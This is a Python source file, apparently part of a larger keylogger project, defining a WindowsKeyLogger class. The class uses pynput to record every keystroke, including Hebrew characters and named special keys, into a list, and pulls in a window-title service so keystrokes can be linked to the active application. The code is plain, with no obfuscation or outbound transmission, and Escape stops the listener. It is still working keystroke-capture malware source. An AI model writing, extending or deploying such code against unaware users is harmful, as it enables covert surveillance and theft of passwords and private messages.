from pynput import keyboard
from typing import List
from factories.window_title_factory import WindowTitleFactory
from interfaces.i_key_logger import IKeyLogger
from utils.window_title_utils import clean_window_title

class WindowsKeyLogger(IKeyLogger):
    def __init__(self):
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.logged_keys: List[str] = []
        self.window_title_service = WindowTitleFactory.create_window_title()

    def on_press(self, key):
        """callback function that is called when a key is pressed"""
        try:
            key_str = str(key.char)  # Regular characters including Hebrew
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.backspace: "BACKSPACE",
                keyboard.Key.shift: "SHIFT",
                keyboard.Key.ctrl_l: "CTRL_L",
                keyboard.Key.ctrl_r: "CTRL_R",
                keyboard.Key.alt_l: "ALT_L",
                keyboard.Key.alt_r: "ALT_R",
                keyboard.Key.tab: "TAB",
                keyboard.Key.esc: "ESCAPE"
            }
            key_str = special_keys.get(key, str(key)) # convert special keys to string
             
        self.logged_keys.append(key_str)
        
    def on_release(self, key):
        """callback function that is called when a key is released"""
        if key == keyboard.Key.esc:
            return False  # stop listener

    def start(self):
        self.listener.start()
        self.listener.join()

    def stop(self):
        self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        return self.logged_keys